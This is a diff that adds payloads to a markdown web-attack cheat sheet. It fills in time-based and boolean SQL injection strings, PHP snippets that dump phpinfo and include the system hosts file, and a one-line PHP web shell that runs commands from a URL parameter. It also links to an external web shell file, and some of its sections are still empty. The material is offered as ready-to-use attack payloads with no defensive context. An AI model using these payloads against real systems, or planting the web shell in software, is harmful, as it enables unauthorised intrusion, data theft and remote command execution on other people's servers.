@@ -1,9 +1,36 @@
-### Time Based Blind SQL Injection
-### Error Based SQL Injection
-### Boolean Based Blind SQL Injection
-### Local File Inclusion (LFI)
-### Remote Code Execution (RCE)
-### Malicious File Upload (Shell Execution)
+### Time Based Blind SQL Injection:
+```
+'(select * from (select(sleep(10)))a)
+';WAITFOR DELAY '0:0:30'--
+```
+### Error Based SQL Injection:
+
+### Boolean Based Blind SQL Injection:
+```
+'2 OR 1=1
+''2 OR 1=1
+"2 OR 1=1
+'2 AND 1=1
+''2 AND 1=1
+"2 AND 1=1
+```
+### Local File Inclusion (LFI):
+```
+
+
+```
+### Remote Code Execution (RCE):
+```
+<?php echo phpinfo(); ?>
+<?php include 'C:\Windows\System32\drivers\etc\hosts';?>
+
+```
+### Malicious File Upload (Shell Execution):
+```
+<?php system($_GET['cmd']); ?>
+
+https://github.com/hackerhijeck/For_Me/blob/main/Web_Shell.php
+```
 ### Application is Vulnerable to Reverse Web shell (Shell Execution)
 ### File Upload Bypass 
 ### Session Hijacking
